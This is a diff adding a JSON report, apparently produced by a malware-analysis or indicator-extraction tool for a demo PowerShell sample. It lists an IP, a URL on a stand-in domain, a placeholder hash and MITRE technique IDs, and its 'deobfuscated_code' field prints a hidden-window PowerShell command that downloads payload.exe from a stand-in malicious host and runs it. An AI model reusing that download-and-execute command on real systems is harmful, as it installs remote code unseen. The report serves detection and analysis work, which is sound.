@@ -1,0 +1,38 @@
+{
+    "file": "samples/demo_payload.txt",
+    "type": "PowerShell",
+    "iterations": 1,
+    "confidence": 0.52,
+    "ips": [
+        "185.100.87.202"
+    ],
+    "urls": [
+        "http://example-malicious.com/payload.exe"
+    ],
+    "domains": [
+        "example-malicious.com",
+        "pay.exe",
+        "payload.exe"
+    ],
+    "emails": [],
+    "hashes": {
+        "sha256": [
+            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+        ]
+    },
+    "mitre": [
+        {
+            "id": "T1059.001",
+            "name": "PowerShell"
+        },
+        {
+            "id": "T1027",
+            "name": "Obfuscated Files or Information"
+        },
+        {
+            "id": "T1071.001",
+            "name": "Web Protocols"
+        }
+    ],
+    "deobfuscated_code": "powershell -NoP -W Hidden -EncodedCommand \n$u=\"http://example-malicious.com/payload.exe\";\n$p=\"$env:TEMP\\pay.exe\";\nInvoke-WebRequest -Uri $u -OutFile $p;\nStart-Process $p;\n# C2 185.100.87.202\n# sha256 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n\n"
+}
